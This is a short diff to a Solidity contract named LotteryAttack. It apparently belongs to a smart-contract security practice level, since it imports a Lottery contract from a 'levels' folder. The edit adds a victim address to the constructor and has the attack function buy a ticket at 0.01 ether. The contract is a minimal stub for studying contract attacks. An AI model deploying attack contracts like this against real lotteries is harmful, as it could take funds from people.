@@ -5,11 +5,11 @@ import '../levels/Lottery.sol';
 contract LotteryAttack {
   Lottery lottery;
 
-  function LotteryAttack () payable {
+  function LotteryAttack (address _victim) payable {
     lottery = Lottery(_victim);
   }
 
   function attack(address target) {
-    lottery.bet.value(0.000000001)(this);
+    lottery.purchaseTicket.value(0.01 ether)(12);
   }
 }
